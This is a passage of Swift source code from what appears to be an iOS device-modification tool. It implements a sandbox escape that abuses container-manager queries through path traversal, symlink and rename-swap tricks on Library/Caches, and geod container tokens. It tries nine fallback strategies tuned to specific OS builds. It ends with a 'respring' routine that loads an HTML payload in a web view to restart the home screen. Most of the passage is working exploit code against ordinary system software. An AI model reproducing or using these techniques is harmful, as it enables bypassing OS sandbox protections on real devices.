            if let root = queryPathOnly(cls: 12, ident: gid, group: false, part: 0, flags: 0x100000000) {
                caches = (root as NSString).appendingPathComponent("Library/Caches")
            }
        }
        guard !caches.isEmpty else { return -2 }
        if caches.hasPrefix("/var/") { caches = "/private" + caches }

        let flagList: [UInt64] = [0x8000000000, 0x0800000000, 0x8100000000]
        var h1: Int64 = -1
        var useFlags: UInt64 = 0
        var path: String?
        for flags in flagList {
            h1 = queryEscape(12, ident: gid, group: false, part: 3, domain: "",
                             flags: flags, label: "class12-geod-direct-\(flags)", outPath: &path)
            if h1 >= 0 {
                useFlags = flags
                break
            }
        }
        if h1 < 0 { return h1 }

        try? FileManager.default.createDirectory(
            atPath: (caches as NSString).deletingLastPathComponent,
            withIntermediateDirectories: true)
        guard canOpenDir(caches) else {
            log("geod: token did not open \(caches) errno=\(errno)")
            release(h1)
            return -5
        }

        let bak = caches + ".bqgeod"
        recover(caches, bak)
        guard swapPath(path: caches, target: target, bak: bak) else {
            restorePath(caches, bak)
            release(h1)
            return -2
        }

        var path2: String?
        var h2 = queryEscape(12, ident: gid, group: false, part: 3, domain: "",
                             flags: useFlags, label: "class12-geod-symlink", outPath: &path2)
        if h2 >= 0 && !canOpenDir(target) {
            log("geod: symlink token did not open target")
            release(h2)
            h2 = -5
        }
        restorePath(caches, bak)
        release(h1)
        if h2 >= 0 {
            linkOut = target
            log("escape: using geod class12 symlink -> \(target)")
        }
        return h2
    }

    // ---- escape lease -------------------------------------------------------

    private static var escapeGroupRoot: String?
    private static var traversalState = 0 // 0 unknown, 1 works, -1 unsupported

    /// Escape to `target` (an MCM container or a directory inside one). On
    /// success the handle is >= 0 and `link` resolves to `target`. Always call
    /// endEscape() with the handle when done.
    static func escape(_ target: String) -> (handle: Int64, link: String?) {
        guard !target.isEmpty else { return (-1, nil) }
        loadMCM()
        var last: Int64 = -1

        // 0. Exact bad_query file form (free-certificate path used by GestaltEdit).
        if target == kMGCaches || target.hasSuffix("/Library/Caches") {
            var link: String?
            let h = escapeBadQueryFile(target, &link)
            if h >= 0 { return (h, link) }
            last = h
        }

        // 1. Old bad_query: class 13 + part-domain traversal. No app group
        //    needed. Works on builds where the traversal is not patched
        //    (27.0.x), fails on 27.2.
        stateLock.lock()
        let traversalOK = traversalState >= 0
        stateLock.unlock()
        if traversalOK && target.hasPrefix("/") {
            let dom = dots(12) + target
            var p: String?
            let h = queryEscape(13, ident: kMGGroup, group: true, part: 3, domain: dom,
                                flags: 0x8000000000, label: "class13-traversal", outPath: &p)
            if h >= 0 {
                stateLock.lock()
                traversalState = 1
                stateLock.unlock()
                log("escape: using class13 traversal -> \(p ?? target)")
                return (h, p ?? target)
            }
            stateLock.lock()
            traversalState = -1
            stateLock.unlock()
            last = h
        }

        // 2. Class 12 geod built-in container: direct token, then symlink Caches.
        do {
            var link: String?
            let h = escapeGeodSymlink(target, &link)
            if h >= 0 { return (h, link ?? target) }
            last = h
        }

        // 3. App-group part-directory symlink (27.2).
        if let gid = groupID(), !gid.isEmpty {
            var link: String?
            let h = escapeSymlink(target, &link)
            if h >= 0 {
                log("escape: using class7 symlink")
                return (h, link)
            }
            last = h
        }

        // 4. Swap Library/Caches with a symlink using RENAME_SWAP. This avoids
        //    the denied plain rename and never moves Library.
        do {
            var link: String?
            let h = escapeClass2Swap(target, &link)
            if h >= 0 {
                log("escape: using class2 swap")
                return (h, link ?? target)
            }
            last = h
        }

        // 5. Class 2 staged symlink: a fake Library/Caches tree inside the
        //    app's Caches, resolved through a partDomain symlink. Safe and no
        //    app group.
        do {
            var link: String?
            let h = escapeClass2Stage(target, &link)
            if h >= 0 {
                log("escape: using class2 stage")
                return (h, link ?? target)
            }
            last = h
        }

        // 6. Class 2 symlink inside the existing Library/Caches. This is safe
        //    and needs no app group; it only works if MCM follows a relative
        //    symlink in partDomain without rejecting the resolved target.
        do {
            var link: String?
            let h = escapeClass2Subpath(target, &link)
            if h >= 0 {
                log("escape: using class2 subpath")
                return (h, link ?? target)
            }
            last = h
        }

        // 7. Class 2 parent-directory symlink. No app group needed: swap or
        //    move the app's Library, point Caches at the target, query the
        //    app's own container (class 2), then restore Library. Off by
        //    default: some builds kill the process for moving Library, so this
        //    is opt-in from Settings.
        if class2ParentEnabled {
            var link: String?
            var h = escapeClass2LibrarySwap(target, &link)
            let defs = UserDefaults.standard
            defs.set(false, forKey: "BQClass2ParentCrashGuard")
            defs.synchronize()
            if h >= 0 {
                log("escape: using class2 library swap")
                return (h, link ?? target)
            }
            last = h

            h = escapeClass2Parent(target, &link)
            if h >= 0 {
                log("escape: using class2 parent")
                return (h, link ?? target)
            }
            last = h
        } else {
            log("class2-parent disabled (enable in Settings if there is no app group)")
        }

        // 8. Class 13 direct MobileGestalt query (some 27.0.x builds).
        if target == kMGCaches {
            var p: String?
            let h = queryEscape(13, ident: kMGGroup, group: true, part: 3, domain: "",
                                flags: 0x8000000000, label: "class13-direct", outPath: &p)
            if h >= 0 {
                log("escape: using class13 direct")
                return (h, p ?? target)
            }
            last = h
        }

        // 9. Class 12 geod part-domain traversal (older builds).
        if target.hasPrefix("/") {
            let dom = dots(12) + target
            var p: String?
            let h = queryEscape(12, ident: "com.apple.geod", group: false, part: 3,
                                domain: dom, flags: 0x8000000000,
                                label: "class12-geod-traversal", outPath: &p)
            if h >= 0 {
                log("escape: using class12 geod traversal")
                return (h, p ?? target)
            }
            last = h
        }

        log("escape: all strategies failed (last=\(last)) target=\(target)")
        return (last, nil)
    }

    /// Human-readable reason for an escape failure code.
    static func escapeError(_ handle: Int64) -> String? {
        switch handle {
        case -6:
            return NSLocalizedString("no app group — open Settings → Class-2 fallback (experimental), enable it, then retry",
                                     comment: "escape error")
        case -2:
            return NSLocalizedString("class-2 fallback could not move Library — this build needs an app group on 27.2",
                                     comment: "escape error")
        case -5:
            return NSLocalizedString("the MCM query returned no sandbox token — send Documents/bqtool.log",
                                     comment: "escape error")
        default:
            return String(format: NSLocalizedString("escape failed (%lld)", comment: "escape error"), handle)
        }
    }

    /// Release the sandbox extension and restore anything the successful
    /// strategy left behind (the group's Caches symlink).
    static func endEscape(_ handle: Int64) {
        if handle >= 0 { release(handle) }
        stateLock.lock()
        let groot = escapeGroupRoot
        escapeGroupRoot = nil
        stateLock.unlock()
        guard let groot, !groot.isEmpty else { return }
        let lib = (groot as NSString).appendingPathComponent("Library")
        let caches = (lib as NSString).appendingPathComponent("Caches")
        let bak = (lib as NSString).appendingPathComponent("Caches.bqtool")
        restorePath(caches, bak)
    }

    // ---- respring (WebKit file-URL fallback for NeoSpring) -------------------

    private static var respringWebView: WKWebView?

    private static func keyWindow() -> UIWindow? {
        let scenes = UIApplication.shared.connectedScenes.compactMap { $0 as? UIWindowScene }
        for scene in scenes {
            if let key = scene.windows.first(where: \.isKeyWindow) { return key }
            if let any = scene.windows.first { return any }
        }
        return nil
    }

    static func respring() {
        DispatchQueue.main.async {
            guard let win = keyWindow() else {
                log("respring: no window")
                return
            }
            log("respring: NeoSpring start")

            let black = UIView(frame: win.bounds)
            black.backgroundColor = .black
            black.autoresizingMask = [.flexibleWidth, .flexibleHeight]
            win.addSubview(black)

            let spinner = UIActivityIndicatorView(style: .large)
            spinner.center = CGPoint(x: black.bounds.midX, y: black.bounds.midY)
            spinner.autoresizingMask = [.flexibleLeftMargin, .flexibleRightMargin,
                                        .flexibleTopMargin, .flexibleBottomMargin]
            spinner.color = .white
            spinner.startAnimating()
            black.addSubview(spinner)

            DispatchQueue.main.asyncAfter(deadline: .now() + 0.25) {
                let cfg = WKWebViewConfiguration()
                cfg.defaultWebpagePreferences.allowsContentJavaScript = true
                let wv = WKWebView(frame: win.bounds, configuration: cfg)
                wv.autoresizingMask = [.flexibleWidth, .flexibleHeight]
                wv.isUserInteractionEnabled = false
                win.insertSubview(wv, belowSubview: black)
                var path = Bundle.main.path(forResource: "respring", ofType: "html")
                if path == nil || path!.isEmpty {
                    path = (documents() as NSString).appendingPathComponent("respring.html")
                }
                if let path, !path.isEmpty {
                    let url = URL(fileURLWithPath: path)
                    log("respring: loading payload from \(path)")
                    wv.loadFileURL(url, allowingReadAccessTo: url.deletingLastPathComponent())
                } else {
                    log("respring.html missing")
                }
                respringWebView = wv
            }
        }
    }
}
